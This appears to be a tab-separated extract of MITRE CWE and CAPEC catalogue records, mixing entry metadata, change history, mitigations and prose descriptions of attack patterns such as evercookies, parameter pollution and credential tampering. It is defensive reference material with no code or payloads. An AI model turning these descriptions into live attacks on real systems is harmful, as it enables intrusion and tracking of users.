8598	33	Pascal Meunier
9908	35	MITRE
21080	70	Core Concepts: Attack Patterns
10227	35	MITRE
19051	81	Confidentiality
19610	61	Stable
18668	62	updated Causal_Nature, Relationships
16459	91	Implementation
24450	50	Ensure that protocols have specific limits of scale configured.
16057	40	The encryption algorithm is known to the attacker.
15699	97	XSS Using Doubled Characters
12691	51	2015-11-09
16514	62	updated Relationships
15411	102	ChildOf
14672	50	Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.
24713	39	2012-05-11
10604	35	MITRE
9849	21	CWE Content Team
17786	21	CWE Content Team
24376	28	CWE Content Team
19784	54	Low
15996	25	Medium
21618	48	05
13496	35	MITRE
23958	35	MITRE
5927	30	Alexander Sotirov
19222	28	CWE Content Team
24616	39	2011-06-27
20482	62	updated Description
19018	40	The schema used by the target application must be improperly secured against unauthorized modification and manipulation.
14525	39	2013-02-21
7594	35	MITRE
14179	39	2010-12-13
22462	26	Implementation
14264	39	2012-05-11
11822	59	Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances
17682	77	Automated Static Analysis - Binary or Bytecode
23249	104	202
10690	104	555
11635	102	ChildOf
19844	88	Path Equivalence: 'file...name' (Multiple Internal Dot)
14468	81	Integrity
6417	28	CWE Content Team
23367	76	2015-12-07
18918	35	MITRE
20523	46	Attackers can reverse engineer binary code to obtain secret data. This is especially easy when the cleartext is plain ASCII. Even if the information is encoded in a way that is not human-readable, certain techniques could determine which encoding is being used, then decode the information.
15711	35	MITRE
7137	35	MITRE
12389	21	CWE Content Team
15655	39	2010-12-13
12811	97	Overflow Variables and Tags
5833	28	CWE Content Team
6148	45	Base
11959	35	MITRE
19029	35	MITRE
11793	62	updated Relationships
23896	103	Primary
13713	76	2019-04-04
19860	90	C
8627	35	MITRE
18643	62	updated Demonstrative_Examples
11823	31	1000
6323	70	OWASP Testing Guide
11882	46	Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.             Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.
6750	35	MITRE
10490	25	Medium
8269	56	ChildOf
6322	90	C++
18608	31	699
14102	63	Modify Files or Directories
18227	94	Extract long-term secret keys (e.g. keys used for VPN or WiFi authentication and encryption) to enable decryption of intercepted VOIP traffic.
23570	28	CWE Content Team
9302	35	MITRE
18673	28	CWE Content Team
23325	62	updated Relationships, Taxonomy_Mappings
13367	103	Primary
20329	28	CWE Content Team
20088	28	CWE Content Team
11942	90	Language-Independent
10852	96	2011-05-15
7388	39	2014-07-30
21496	103	Primary
20694	26	Operation
11476	33	Pratyusa Manadhata
10642	73	Try to use UTF-8 encoding of content in CSS in order to bypass validation routines.
12724	101	CAPEC Content Team
11145	43	Simple
18456	79	Confidentiality
11393	35	MITRE
20808	53	The MITRE Corporation
18933	39	2008-09-08
10061	91	Requirements
12677	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
12184	23	An attacker creates a very persistent cookie that stays present even after the user thinks it has been removed. The cookie is stored on the victim's machine in over ten places to include: Standard HTTP Cookies, Local Shared Objects (Flash Cookies), Silverlight Isolated Storage, Storing cookies in RGB values of auto-generated, force-cached, PNGs using HTML5 Canvas tag to read pixels (cookies) back out, Storing cookies in Web History, Storing cookies in HTTP ETags, Storing cookies in Web cache, window.name caching, Internet Explorer userData storage, HTML5 Session Storage, HTML5 Local Storage, HTML5 Global Storage, HTML5 Database Storage via SQLite, among others. When the victim clears the cookie cache via traditional means inside the browser, that operation removes the cookie from certain places but not others. The malicious code then replicates the cookie from all of the places where it was not deleted to all of the possible storage locations once again. So the victim again has the cookie in all of the original storage locations. In other words, failure to delete the cookie in even one location will result in the cookie's resurrection everywhere. The evercookie will also persist across different browsers because certain stores (e.g., Local Shared Objects) are shared between different browsers.
24431	28	KDM Analytics
21446	56	CanPrecede
13278	63	Bypass Protection Mechanism
25052	28	CWE Content Team
12385	35	Veracode
24700	62	updated Relationships
14694	62	updated Relationships, Taxonomy_Mappings
24639	63	Reduce Maintainability
19849	81	Other
23094	35	MITRE
18793	61	Draft
22057	50	Implementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.
11100	62	added/updated demonstrative examples
20656	62	updated Relationships
9006	104	428
20634	39	2008-07-01
22854	28	CWE Content Team
24369	62	updated References
9581	102	ChildOf
9971	62	updated Potential_Mitigations
20096	50	At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly.
14634	62	updated Relationships
8014	62	updated Relationships
13172	35	MITRE
6746	81	Integrity
17708	35	MITRE
6106	62	updated Type
7101	78	Medium
10418	91	Implementation
18896	28	CWE Content Team
9150	76	2019-04-04
13006	81	Confidentiality
18821	43	Simple
12567	40	The target browser must access content server from the adversary controlled DNS name. Web advertisements are often used for this purpose. The target browser must honor the TTL value returned by the adversary and re-resolve the adversary's DNS name after initial contact.
6569	100	The MITRE Corporation
15678	42	Use an abstraction library to abstract away risky APIs. Not a complete solution.
6830	62	updated Description, Name
24332	58	A certificate is a token that associates an identity (principal) to a cryptographic key. Certificates can be used to check if a public key belongs to the assumed owner.
9336	62	updated Demonstrative_Examples
24177	28	CWE Content Team
7186	26	Implementation
17535	79	Confidentiality
16058	62	updated Relationships
23767	59	Updated @Abstraction
25046	35	MITRE
10481	59	Updated Description Summary
16321	76	2015-11-09
20078	63	Modify Application Data
15729	81	Confidentiality
8840	28	CWE Content Team
15218	69	Draft
24076	21	CWE Content Team
21041	26	Architecture and Design
5587	28	CWE Content Team
13428	62	updated Demonstrative_Examples
12703	89	Detailed
19052	39	2017-11-08
25339	76	2017-05-01
7456	28	CWE Content Team
22900	43	Simple
6778	73	Adversary must know the transaction ID by intercepting a DNS query, or sending a bogus query with known transaction ID.
23211	39	2014-06-23
8774	48	09
16977	81	Availability
12619	103	Primary
24185	51	2014-06-23
14080	62	updated Description, Relationships, Theoretical_Notes
7556	62	updated Related_Attack_Patterns
21130	39	2008-09-08
9330	62	updated Potential_Mitigations
23873	63	DoS: Crash, Exit, or Restart
10026	97	Argument Injection
22554	103	Primary
7815	62	updated Common_Consequences
21064	42	Consider alternatives to account lockout that would still be effective against password brute force attacks, such as presenting the user machine with a puzzle to solve (makes it do some computation).
18714	35	MITRE
8448	35	MITRE
19039	35	MITRE
18041	95	The attacker found an unfiltered combination which maps to a valid path and accesses unauthorized resources (directories, files, etc.)
21792	35	MITRE
22534	39	2012-10-30
9495	39	2017-11-08
7203	23	The software performs an operation on a number that causes it to be sign extended when it is transformed into a larger data type. When the original number is negative, this can produce unexpected values that lead to resultant weaknesses.
23446	62	updated Affected_Resources, Causal_Nature, Likelihood_of_Exploit, References, Relationships, Relevant_Properties, Taxonomy_Mappings
22373	35	MITRE
21523	47	Gain Privileges
19262	47	Unreliable Execution
9222	56	ChildOf
5880	39	2014-06-23
13123	22	02
22472	46	Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user-related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system.             For example, attackers can look at places where user specific data is retrieved (e.g. search screens) and determine whether the key for the item being looked up is controllable externally. The key may be a hidden field in the HTML form field, might be passed as a URL parameter or as an unencrypted cookie variable, then in each of these cases it will be possible to tamper with the key value.             One manifestation of this weakness is when a system uses sequential or otherwise easily-guessable session IDs that would allow one user to easily switch to another user's session and read/modify their data.
16323	92	Experiment
24746	102	ChildOf
22810	39	2012-10-30
14602	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis
7845	104	926
6909	62	updated Observed_Examples, Relationships
6762	47	Bypass Protection Mechanism
16048	28	CWE Content Team
11442	62	updated Time_of_Introduction
21389	28	CWE Content Team
20870	86	http://blogs.technet.com/b/srd/archive/2009/06/12/understanding-dep-as-a-mitigation-technology-part-1.aspx
20916	62	updated Potential_Mitigations, Time_of_Introduction
24757	62	updated Potential_Mitigations, Time_of_Introduction
13785	92	Explore
9755	59	Updated Related_Attack_Patterns
20211	28	CWE Content Team
8738	89	Standard
17447	72	The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.
10141	81	Integrity
20273	40	Physical access to a gray market reseller's hardware components supply, or the ability to appear as a gray market reseller to the victim's buyer.
21049	78	High
17638	28	CWE Content Team
11968	56	CanPrecede
19019	92	Exploit
14107	23	The software assigns the wrong ownership, or does not properly verify the ownership, of an object or resource.
25043	39	2015-12-07
7299	103	Primary
16012	35	MITRE
6834	39	2012-05-11
21582	26	Implementation
24698	35	MITRE
22493	35	MITRE
13814	63	DoS: Crash, Exit, or Restart
9733	56	ChildOf
16812	28	CWE Content Team
13489	56	ChildOf
15404	62	updated Common_Consequences, Related_Attack_Patterns, Relationships
9806	103	Primary
18197	62	updated Applicable_Platforms
11197	62	updated Common_Consequences, Observed_Examples, Potential_Mitigations, References, Relationships
21930	62	updated Relationships
6954	22	12
9940	50	In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.
12426	56	ChildOf
15172	39	2017-11-08
16395	39	2009-12-28
6130	56	ChildOf
22036	70	Piloting Supply Chain Risk Management Practices for Federal Information Systems
19617	39	2012-10-30
9321	28	CWE Content Team
20793	35	MITRE
6022	100	The MITRE Corporation
7934	62	updated Relationships
15344	62	updated Potential_Mitigations
19416	28	CWE Content Team
24976	100	The MITRE Corporation
5895	35	Cigital
16609	28	CWE Content Team
6589	26	Implementation
16142	56	ChildOf
17754	61	Draft
18473	28	CWE Content Team
7306	88	Insufficient Resource Pool
17022	35	MITRE
23827	91	Implementation
9962	39	2017-11-08
11418	79	Confidentiality
7701	76	2019-09-30
22884	62	updated Applicable_Platforms, Description, Name, Potential_Mitigations, Terminology_Notes
24415	39	2014-07-30
8828	53	The MITRE Corporation
23444	88	Trusting HTTP Permission Methods on the Server Side
22165	35	MITRE
17082	62	updated Related_Attack_Patterns
19177	90	Java
14382	56	ChildOf
12893	28	CWE Content Team
14820	63	DoS: Crash, Exit, or Restart
6261	80	To identify file system entry point and execute against an over-privileged system interface
5819	35	MITRE
10791	56	ChildOf
18667	63	Read Application Data
17892	39	2008-09-08
13683	79	Availability
10979	28	CWE Content Team
16482	35	MITRE
23968	45	Base
10906	35	MITRE
13604	101	CAPEC Content Team
11915	28	CWE Content Team
16381	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
5996	31	1000
22301	39	2009-03-10
13465	39	2013-02-21
16124	39	2012-10-30
17475	39	2011-06-27
25233	26	Architecture and Design
23749	47	Read Data
14993	42	Remove any Shells accessible under the web root folder and children directories.
8127	39	2008-07-01
6082	39	2019-06-20
24012	33	Kai Chen
16282	28	CWE Content Team
9209	43	Simple
19211	30	A. Muffet
13367	56	ChildOf
19968	88	Obscured Security-relevant Information by Alternate Name
16162	59	Updated @Abstraction
8633	55	CAPEC Content Team
13643	53	The MITRE Corporation
8303	90	Language-Independent
12330	72	If a file or other resource is written in this method, as opposed to in a valid way, logging of the activity may not occur.
22390	103	Primary
5807	97	Adding a Space to a File Extension
6766	35	MITRE
16941	103	Primary
23943	24	MITRE
12636	89	Detailed
20615	56	ChildOf
5958	39	2010-04-05
9241	62	updated Time_of_Introduction
13744	73	Manually explore application and inventory all application inputs
14637	62	updated Common_Consequences, Description, Maintenance_Notes, Relationships, Other_Notes, Taxonomy_Mappings
20062	28	CWE Content Team
16341	39	2008-10-14
24183	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8775	28	CWE Content Team
22517	56	ChildOf
14831	59	Updated Related_Attack_Patterns
6193	62	updated Maintenance_Notes, Relationships, Taxonomy_Mappings
6844	28	Eric Dalci
16256	39	2015-12-07
7260	62	updated Modes_of_Introduction, Relationships
6721	35	MITRE
5915	104	916
12570	39	2012-10-30
11541	39	2018-03-27
24258	39	2010-02-16
8505	28	CWE Content Team
16285	55	CAPEC Content Team
22797	28	CWE Content Team
20435	62	updated Applicable_Platforms, Relevant_Properties
24350	56	ChildOf
9933	62	updated Common_Consequences
18126	73	Craft and Execute underlying SQL query
24889	44	High
15445	39	2012-10-30
18489	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
6320	103	Primary
10820	81	Other
9633	66	Comparing Floating Point Numbers, 2012 Edition
24715	42	Deploy different layers of protection to implement security in depth.
9642	62	updated Common_Consequences
21857	69	Draft
6404	39	2014-06-23
9743	91	Architecture and Design
17546	96	2018-07-02
23292	81	Other
12587	35	MITRE
19982	50	Design: Range, size and value and consistency verification for any arguments supplied to applications and services from external sources and devise appropriate error response.
17364	26	Installation
17925	36	http://www.kb.cert.org/vuls/id/800113#pat
19341	35	MITRE
8118	46	This issue can prevent the software from running reliably, since an outage for the remote resource can cause the software to hang.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
22589	79	Authorization
25012	54	Medium
15833	39	2014-07-30
24632	25	High
24410	28	CWE Content Team
10418	42	Apply strict input validation by using whitelists or indirect selection to ensure that the user is only selecting allowable classes or code.
18553	27	The technical resources necessary to engage in reverse engineering differ in accordance with the type of object, resource, or system being analyzed.
18722	104	611
23734	35	MITRE
12576	59	Updated Attack_Prerequisites, Description Summary, Related_Weaknesses, Solutions_and_Mitigations
18515	35	MITRE
19000	62	updated Description
13171	23	The program accesses or uses a pointer that has not been initialized.
18588	90	C
23117	100	The MITRE Corporation
11423	103	Primary
16645	62	updated Other_Notes, Potential_Mitigations
18947	56	ChildOf
22718	70	Seven Steps to XML Mastery
24081	21	PLOVER
16398	88	Function Call With Incorrect Argument Type
21110	62	updated Observed_Examples, Relationships
20612	81	Confidentiality
18208	74	3
10549	55	CAPEC Content Team
15992	31	1003
20593	62	updated Description, Potential_Mitigations, Time_of_Introduction
6198	35	MITRE
8775	62	updated Relationships
11889	46	Dead code is source code that can never be executed in a running program. The surrounding code makes it impossible for a section of code to ever be executed.
19932	81	Access Control
22439	35	MITRE
16733	74	2
6290	50	Identify programs that may be used to acquire process information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.
18275	62	updated Affected_Resources, Modes_of_Introduction, Observed_Examples, References, Relationships
18678	48	08
25213	62	updated Demonstrative_Examples
9750	35	MITRE
19391	33	Michael Eddington
19280	45	Base
15238	91	Implementation
8945	31	1000
18087	35	MITRE
22971	79	Confidentiality
17516	59	Updated Attack_Phases
21976	62	updated Time_of_Introduction
9796	63	Reduce Maintainability
7627	35	MITRE
10251	56	ChildOf
16977	63	Read Application Data
10447	35	MITRE
13107	40	Access to the software during the development phase. This access is often obtained via insider access to include the 3rd party component after deployment.
14757	39	2017-11-08
20258	71	2008
7142	48	05
22818	39	2008-10-14
22541	46	As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.
25220	79	Confidentiality
6012	42	Consider adhering to the following rules when allocating and managing an application's memory:                                                                  Double check that your buffer is as large as you specify.                         When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.                         Check buffer boundaries if accessing the buffer in a loop and make sure you are not in danger of writing past the allocated space.                         If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.
22535	28	CWE Content Team
20983	97	Token Impersonation
6630	62	updated Description
8679	35	MITRE
24903	62	updated Potential_Mitigations
18397	78	High
20109	62	updated Common_Consequences, Potential_Mitigations, Relationships, Taxonomy_Mappings
14681	62	added Language_Class "All"
21274	28	CWE Content Team
10606	103	Primary
23180	62	updated Related_Attack_Patterns
15825	39	2009-03-10
9487	35	MITRE
10439	62	updated Common_Consequences, Maintenance_Notes, Relationships, Theoretical_Notes
12894	72	An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality.
15788	39	2008-07-01
18245	102	ChildOf
18316	62	updated Relationships
18082	26	Implementation
8477	28	CWE Content Team
9523	89	Meta
19970	62	updated Relationships, Taxonomy_Mappings
10194	31	1000
12268	42	Follow the resource's lifecycle from creation to release.
9752	104	838
11182	54	High
25064	39	2012-05-11
14843	53	The MITRE Corporation
11536	80	Resources to maliciously construct/alter hardware components used for testing by the supplier.
24647	28	CWE Content Team
15242	31	1000
10370	32	OWASP
6195	56	ChildOf
18931	76	2018-07-31
23784	100	The MITRE Corporation
12643	28	CWE Content Team
14347	91	Implementation
14101	88	Data Element Aggregating an Excessively Large Number of Non-Primitive Elements
9203	43	Simple
23793	45	Base
15222	62	updated Relationships, Taxonomy_Mappings
25001	39	2008-09-08
15969	51	2014-06-23
24017	62	updated Relationships
11987	46	On some operating systems, the fact that the temporary file exists may be apparent to any user with sufficient privileges to access that directory. Since the file is visible, the application that is using the temporary file could be known. If one has access to list the processes on the system, the attacker has gained information about what the user is doing at that time. By correlating this with the applications the user is running, an attacker could potentially discover what a user's actions are. From this, higher levels of security could be breached.
17798	103	Primary
11975	76	2017-05-01
19317	59	Updated Attack_Prerequisites, Resources_Required
7176	39	2008-07-01
15035	39	2009-03-10
13455	28	CWE Content Team
24967	26	Implementation
16767	62	updated Relationships, Taxonomy_Mappings
18511	40	Access to the component currently deployed at a victim location.
15341	99	Adobe
9110	102	ChildOf
10476	30	Nick Nikiforakis
23216	79	Other
8841	53	The MITRE Corporation
10662	76	2019-04-04
21713	73	Use a browser to manually explore the website by issuing a request ending the URL in a slash '/'.
7552	45	Base
19949	63	DoS: Crash, Exit, or Restart
20447	102	ChildOf
24866	70	A new Zeus variant targeting Salesforce.com – Research and Analysis
21089	62	updated Demonstrative_Examples
5654	39	2018-03-27
9075	46	When software generates predictable values in a context requiring unpredictability, it may be possible for an attacker to guess the next value that will be generated, and use this guess to impersonate another user or access sensitive information.
14654	80	Attacker may be required to create malformed data blobs and know how to insert them in a location that the recipient will visit.
7983	28	CWE Content Team
6608	89	Standard
8519	59	Updated Attack_Phases, Description, Description Summary, References, Related_Weaknesses
14206	23	The product uses a fixed or controlled search path to find resources, but one or more locations in that path can be under the control of unintended actors.
6513	23	The application attempts to return a memory resource to the system, but it calls a release function that is not compatible with the function that was originally used to allocate that resource.
15292	35	MITRE
10121	61	Draft
10165	39	2017-11-08
10346	62	updated Relationships
20185	81	Confidentiality
5903	39	2011-06-01
13342	28	CWE Content Team
7431	57	Primary
22841	104	1072
9346	38	The log can have a trace of abnormal activity. Also if abnormal activity is detected on the host target. For instance flooding should be seen as abnormal activity and the target host may decide to take appropriate action in order to mitigate the attack (data filtering or blocking). Resource exhaustion is also a sign of abnormal activity.
13454	62	updated Relationships
8724	42	Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.                   If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.                   Exposing additional information to a potential attacker in the context of an exceptional condition can help the attacker determine what attack vectors are most likely to succeed beyond DoS.
25201	91	Implementation
16043	30	Bryan Sullivan
8935	62	updated Demonstrative_Examples
10064	62	Improved the White_Box_Definition
19111	35	MITRE
9703	62	updated Taxonomy_Mappings
22883	57	Resultant
24667	31	699
12704	62	updated Demonstrative_Examples, Potential_Mitigations
9518	28	CWE Content Team
19876	57	Indirect
8115	40	This scan type is not possible with some operating systems (Windows XP SP 2). On Linux and Unix systems it requires root privileges to use raw sockets.
18234	39	2008-09-08
6322	90	C#
8674	62	added/updated white box definitions
9144	55	CAPEC Content Team
14672	23	An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information.
6310	62	updated Relationships
17549	28	CWE Content Team
24655	39	2010-12-13
17576	28	CWE Content Team
15944	31	1000
9294	90	Language-Independent
14881	62	updated Relationships
12026	31	699
19315	39	2008-09-08
6413	62	updated References, Relationships
17642	62	updated Common_Consequences
19424	47	Execute Unauthorized Commands
18175	39	2019-09-19
14878	86	https://www.us-cert.gov/ncas/alerts/TA14-017A
25303	28	CWE Content Team
23979	62	updated Potential_Mitigations
25194	63	Other
19447	72	The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.
14674	28	CWE Content Team
21932	21	Landwehr
9356	76	2018-07-31
11186	62	updated Observed_Examples
23183	46	In the absence of a policy to restrict asymmetric resource consumption, the application or system cannot distinguish between legitimate transmissions and traffic intended to serve as an amplifying attack on target systems. Systems can often be configured to restrict the amount of traffic sent out on behalf of a client, based on the client's origin or access level. This is usually defined in a resource allocation policy. In the absence of a mechanism to keep track of transmissions, the system or application can be easily abused to transmit asymmetrically greater traffic than the request or client should be permitted to.
13358	28	CWE Content Team
13641	62	updated Description, Relationships, Observed_Example, Other_Notes, Taxonomy_Mappings
14270	104	98
22903	62	updated Applicable_Platforms, Description, Modes_of_Introduction, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
10144	54	High
16416	43	Simple
15264	28	Eric Dalci
11796	43	Simple
19647	48	03
13221	101	CAPEC Content Team
25050	21	PLOVER
11666	90	Language-Independent
24923	86	http://www.codinghorror.com/blog/archives/000949.html
6893	39	2017-01-19
10315	103	Primary
10032	28	CWE Content Team
24710	63	DoS: Resource Consumption (Memory)
10427	28	CWE Content Team
22139	33	David Wheeler
14098	62	updated Common_Consequences
15435	103	Primary
16575	39	2011-09-13
15470	62	updated Relationships
5608	39	2010-06-21
17225	35	MITRE
21690	79	Authorization
6916	23	An adversary creates a client application to interface with a target service where the client violates assumptions the service makes about clients. Services that have designated client applications (as opposed to services that use general client applications, such as IMAP or POP mail servers which can interact with any IMAP or POP client) may assume that the client will follow specific procedures. For example, servers may assume that clients will accurately compute values (such as prices), will send correctly structured messages, and will attempt to ensure efficient interactions with the server. By reverse-engineering a client and creating their own version, an adversary can take advantage of these assumptions to abuse service functionality. For example, a purchasing service might send a unit price to its client and expect the client to correctly compute the total cost of a purchase. If the adversary uses a malicious client, however, the adversary could ignore the server input and declare any total price. Likewise, an adversary could configure the client to retain network or other server resources for longer than legitimately necessary in order to degrade server performance. Even services with general clients can be susceptible to this attack if they assume certain client behaviors. However, such services generally can make fewer assumptions about the behavior of their clients in the first place and, as such, are less likely to make assumptions that an adversary can exploit.
12162	62	updated Relationships
7024	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
20665	28	Eric Dalci
22382	33	D. LeBlanc
22864	63	Reduce Maintainability
14911	62	updated References
19138	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
20944	101	CAPEC Content Team
12810	39	2008-07-01
7494	35	MITRE
5835	39	2009-07-27
20901	91	Implementation
11230	40	The ability to send a TCP SYN packet to a remote target. Depending upon the operating system, the ability to craft SYN packets may require elevated privileges.
10369	28	CWE Content Team
9519	100	The MITRE Corporation
7862	91	Implementation
22023	39	2017-11-08
19874	90	Language-Independent
16457	31	1000
25359	103	Primary
6997	35	MITRE
8580	39	2008-09-08
23519	31	1000
9274	21	PLOVER
15447	50	Prevent adversary access to privileged accounts necessary to install rootkits.
21257	42	Do not rely on client side data. Always perform server side authentication.
15170	100	The MITRE Corporation
10273	85	166
23549	69	Incomplete
6527	35	Cigital
13555	100	The MITRE Corporation
21433	31	1000
14704	43	Simple
12636	97	TCP ACK Ping
9591	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
24319	26	Implementation
18921	42	Recommendations include restricting access to important directories or files by adopting a need to know requirement for both the document and server root, and turning off features such as Automatic Directory Listings that could expose private files and provide information that could be utilized by an attacker when formulating or conducting an attack.
11613	89	Meta
5592	63	Read Memory
11063	35	MITRE
9480	91	Architecture and Design
18159	35	MITRE
11975	101	CAPEC Content Team
16147	21	PLOVER
22777	28	CWE Content Team
19560	84	24
8524	55	CAPEC Content Team
15482	39	2010-06-21
18657	28	CWE Content Team
18141	62	updated Relationships, Taxonomy_Mappings
24430	62	updated Relationships, Taxonomy_Mappings
9985	56	ChildOf
7301	62	added/updated demonstrative examples
17387	47	Bypass Protection Mechanism
11020	28	CWE Content Team
11691	103	Primary
17831	62	updated Relationships
9161	26	Architecture and Design
24341	39	2014-06-23
20220	92	Experiment
13246	35	MITRE
12290	62	updated Relationships
15986	62	updated Relationships
12975	28	CWE Content Team
9594	63	Quality Degradation
12423	28	CWE Content Team
19743	91	Implementation
6447	79	Confidentiality
17942	55	Seamus Tuohy
16508	39	2012-10-30
16719	28	CWE Content Team
16807	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Solutions_and_Mitigations
15787	31	1000
13423	47	Read Data
18083	31	1000
24550	39	2012-05-11
19653	56	ChildOf
9564	39	2012-05-11
5661	103	Primary
21504	35	MITRE
21534	63	Reduce Performance
25222	43	Simple
7454	35	MITRE
12673	81	Access Control
14982	28	CWE Content Team
23575	59	Updated Resources_Required
6929	45	Class
7903	35	MITRE
14765	62	updated Description, Maintenance_Notes
8403	56	ChildOf
13054	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
6609	45	Base
8174	28	CWE Content Team
11307	31	1000
22955	26	Operation
16638	76	2019-04-04
11335	102	ChildOf
23224	95	Adversary determines the nature of state management employed by the application. This includes determining the location (client-side, server-side or both) and possibly the items stored as part of user state.
6175	39	2014-06-23
20011	76	2019-09-30
17275	72	If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven.
24745	62	updated Common_Consequences
22238	35	MITRE
8559	39	2017-11-08
18200	74	1
7752	21	Evgeny Lebanidze
16671	63	Execute Unauthorized Code or Commands
6325	26	Operation
6759	59	Updated Activation_Zone, Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Injection_Vector, Payload, Payload_Activation_Impact, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit
15090	25	Medium
24764	91	Implementation
8706	28	CWE Content Team
15617	72	The data in a Java class can be modified by anyone outside of the Java framework if the packages is distributed.
12836	103	Primary
22989	35	MITRE
10678	62	updated Name, Related_Attack_Patterns
25074	47	Gain Privileges
18809	91	Architecture and Design
18405	28	CWE Content Team
11466	78	Low
17426	35	MITRE
22695	27	The adversary must be able to intercept the transmissions containing the data of interest. Depending on the medium of transmission and the path the data takes between the sender and recipient, the adversary may require special equipment and/or require that this equipment be placed in specific locations (e.g., a network sniffing tool)
25001	28	CWE Content Team
7978	90	C++
21486	53	The MITRE Corporation
11011	101	CAPEC Content Team
7101	23	An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.
8875	62	updated Applicable_Platforms, Maintenance_Notes, Relationships
21584	39	2019-06-20
9001	101	CAPEC Content Team
18791	62	updated Relationships, Taxonomy_Mappings
21207	76	2018-07-31
18959	56	ChildOf
17531	63	Execute Unauthorized Code or Commands
15998	74	1
13243	56	PeerOf
6155	35	MITRE
13543	66	Security Tips
22668	39	2012-05-11
10445	91	Architecture and Design
10165	35	MITRE
7804	62	updated Description, Other_Notes
25436	31	699
14526	62	updated Potential_Mitigations
12841	28	CWE Content Team
14451	62	updated Relationships, Taxonomy_Mappings
15965	62	updated Common_Consequences
21576	62	updated Relationships, Taxonomy_Mappings
23966	23	An attacker overrides or adds HTTP GET/POST parameters by injecting query string delimiters. Via HPP it may be possible to override existing hardcoded HTTP parameters, modify the application behaviors, access and, potentially exploit, uncontrollable variables, and bypass input validation checkpoints and WAF rules.
12937	66	0x00 vs ASP file upload scripts
11050	39	2014-07-30
10863	62	updated Applicable_Platforms, Description, Modes_of_Introduction, Name, References, Relationships
21360	62	updated Relationships
10953	62	updated Demonstrative_Examples, Relationships
15767	91	Architecture and Design
21905	25	High
21885	103	Primary
9438	91	Build and Compilation
6956	28	CWE Content Team
23579	49	2007
12911	103	Primary
6802	56	CanPrecede
7775	80	In order to discover unrestricted resources, the attacker does not need special tools or skills. He only has to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.
15738	35	MITRE
